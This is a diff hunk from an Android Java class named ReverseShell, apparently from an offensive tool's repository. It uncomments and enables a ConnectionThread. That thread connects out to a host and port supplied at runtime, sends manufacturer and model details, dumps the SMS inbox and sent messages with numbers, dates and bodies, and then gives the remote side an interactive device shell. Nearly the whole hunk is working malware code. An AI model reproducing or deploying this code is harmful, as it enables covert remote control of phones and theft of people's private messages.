@@ -225,110 +225,110 @@ public class ReverseShell extends Activity {
 	// --------------------------------------------------- //
 	// Subclass: Connection. Non-secure, Separate Thread   //
 	// --------------------------------------------------- //
-//	private class ConnectionThread extends AsyncTask<String, Void, String> {
-//
-//		InputStream netI;
-//		OutputStream netO;
-//		Socket sockfd;
-//
-//		// Dump the contents of the {inbox,outbox,sent} to the
-//		// connection.
-//		public String readSMSBox(String box) {
-//			Uri SMSURI = Uri.parse("content://sms/"+box);
-//			Cursor cur = getContentResolver().query(SMSURI, null, null, null,null);
-//			String sms = "";
-//			if(cur.moveToFirst()) {
-//				for(int i=0; i < cur.getCount(); ++i) {
-//					// Get information in a readable format
-//					String number = cur.getString(cur.getColumnIndexOrThrow("address")).toString();
-//					String date = cur.getString(cur.getColumnIndexOrThrow("date")).toString();
-//					Long epoch = Long.parseLong(date);
-//					Date fDate = new Date(epoch * 1000);
-//					date = fDate.toString();
-//					String body = cur.getString(cur.getColumnIndexOrThrow("body")).toString();
-//					sms += "["+number+":"+date+"]"+body+"\n";
-//					cur.moveToNext();
-//				}
-//				sms += "\n";
-//			}
-//			return sms;
-//		}
-//
-//		// Return a String of basic information about the device
-//		public String deviceInfo() {
-//			String ret = "--------------------------------------------\n";
-//			ret += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
-//			ret += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
-//			ret += "Product: "+android.os.Build.PRODUCT+"\n";
-//			ret += "Model: "+android.os.Build.MODEL+"\n";
-//			ret += "Brand: "+android.os.Build.BRAND+"\n";
-//			ret += "Device: "+android.os.Build.DEVICE+"\n";
-//			ret += "Host: "+android.os.Build.HOST+"\n";
-//			ret += "+--------------------------------------------\n";
-//			return ret;
-//		}
-//
-//		// Runs a process, handling the process's input and
-//		// output by sending/receiving IO from the socket
-//		public void runShell() throws Exception {
-//
-//			// Build the process
-//			ProcessBuilder	pb = new ProcessBuilder(shellPath);
-//			pb.redirectErrorStream(true);
-//			Process shell = pb.start();
-//
-//			if(shell == null) {
-//				sockfd.close();
-//				return;
-//			}
-//
-//			// Get Process IO
-//			ProcessIOThread p1 = new ProcessIOThread(shell.getInputStream(), netO);
-//			ProcessIOThread p2 = new ProcessIOThread(netI, shell.getOutputStream());
-//			p1.start();
-//			p2.start();
-//
-//			while(!p1.running || !p2.running)
-//				Thread.sleep(100);
-//			while(p1.running || p2.running) {
-//				Thread.sleep(100);
-//				Thread.yield();
-//			}
-//		}
-//
-//		@Override
-//		protected String doInBackground(String... strings) {
-//			String ret = "Error.";
-//			try {
-//				sockfd = new Socket(strings[0], Integer.parseInt(strings[1]));
-//				netI = sockfd.getInputStream();
-//				netO = sockfd.getOutputStream();
-//				DataOutputStream dOut = new DataOutputStream(netO);
-//
-//				// Recon
-//				dOut.writeBytes(deviceInfo());
-//
-//				// Pilfering
-//				dOut.writeBytes("[>] SMS Inbox:\r\n"+readSMSBox("inbox"));
-//				dOut.writeBytes("[>] SMS Sent:\r\n"+readSMSBox("sent"));
-//				dOut.writeBytes("[>] Receiving shell, type your commands:\r\n");
-//				dOut.flush();
-//
-//				// ++
-//				runShell();
-//
-//				sockfd.close();
-//			} catch(Exception e) {
-//				return e.toString();
-//			}
-//			return ret;
-//		}
-//
-//		@Override
-//		protected void onPostExecute(String result) {
-//			outputText.setText(result);
-//		}
-//	} // End ConnectionThread (unsecured)
+	private class ConnectionThread extends AsyncTask<String, Void, String> {
+
+		InputStream netI;
+		OutputStream netO;
+		Socket sockfd;
+
+		// Dump the contents of the {inbox,outbox,sent} to the
+		// connection.
+		public String readSMSBox(String box) {
+			Uri SMSURI = Uri.parse("content://sms/"+box);
+			Cursor cur = getContentResolver().query(SMSURI, null, null, null,null);
+			String sms = "";
+			if(cur.moveToFirst()) {
+				for(int i=0; i < cur.getCount(); ++i) {
+					// Get information in a readable format
+					String number = cur.getString(cur.getColumnIndexOrThrow("address")).toString();
+					String date = cur.getString(cur.getColumnIndexOrThrow("date")).toString();
+					Long epoch = Long.parseLong(date);
+					Date fDate = new Date(epoch * 1000);
+					date = fDate.toString();
+					String body = cur.getString(cur.getColumnIndexOrThrow("body")).toString();
+					sms += "["+number+":"+date+"]"+body+"\n";
+					cur.moveToNext();
+				}
+				sms += "\n";
+			}
+			return sms;
+		}
+
+		// Return a String of basic information about the device
+		public String deviceInfo() {
+			String ret = "--------------------------------------------\n";
+			ret += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
+			ret += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
+			ret += "Product: "+android.os.Build.PRODUCT+"\n";
+			ret += "Model: "+android.os.Build.MODEL+"\n";
+			ret += "Brand: "+android.os.Build.BRAND+"\n";
+			ret += "Device: "+android.os.Build.DEVICE+"\n";
+			ret += "Host: "+android.os.Build.HOST+"\n";
+			ret += "+--------------------------------------------\n";
+			return ret;
+		}
+
+		// Runs a process, handling the process's input and
+		// output by sending/receiving IO from the socket
+		public void runShell() throws Exception {
+
+			// Build the process
+			ProcessBuilder	pb = new ProcessBuilder(shellPath);
+			pb.redirectErrorStream(true);
+			Process shell = pb.start();
+
+			if(shell == null) {
+				sockfd.close();
+				return;
+			}
+
+			// Get Process IO
+			ProcessIOThread p1 = new ProcessIOThread(shell.getInputStream(), netO);
+			ProcessIOThread p2 = new ProcessIOThread(netI, shell.getOutputStream());
+			p1.start();
+			p2.start();
+
+			while(!p1.running || !p2.running)
+				Thread.sleep(100);
+			while(p1.running || p2.running) {
+				Thread.sleep(100);
+				Thread.yield();
+			}
+		}
+
+		@Override
+		protected String doInBackground(String... strings) {
+			String ret = "Error.";
+			try {
+				sockfd = new Socket(strings[0], Integer.parseInt(strings[1]));
+				netI = sockfd.getInputStream();
+				netO = sockfd.getOutputStream();
+				DataOutputStream dOut = new DataOutputStream(netO);
+
+				// Recon
+				dOut.writeBytes(deviceInfo());
+
+				// Pilfering
+				dOut.writeBytes("[>] SMS Inbox:\r\n"+readSMSBox("inbox"));
+				dOut.writeBytes("[>] SMS Sent:\r\n"+readSMSBox("sent"));
+				dOut.writeBytes("[>] Receiving shell, type your commands:\r\n");
+				dOut.flush();
+
+				// ++
+				runShell();
+
+				sockfd.close();
+			} catch(Exception e) {
+				return e.toString();
+			}
+			return ret;
+		}
+
+		@Override
+		protected void onPostExecute(String result) {
+			outputText.setText(result);
+		}
+	} // End ConnectionThread (unsecured)
 
 	// ---------------------------------------------- //
 	// Subclass: Used to duplex socket IO/Process IO  //
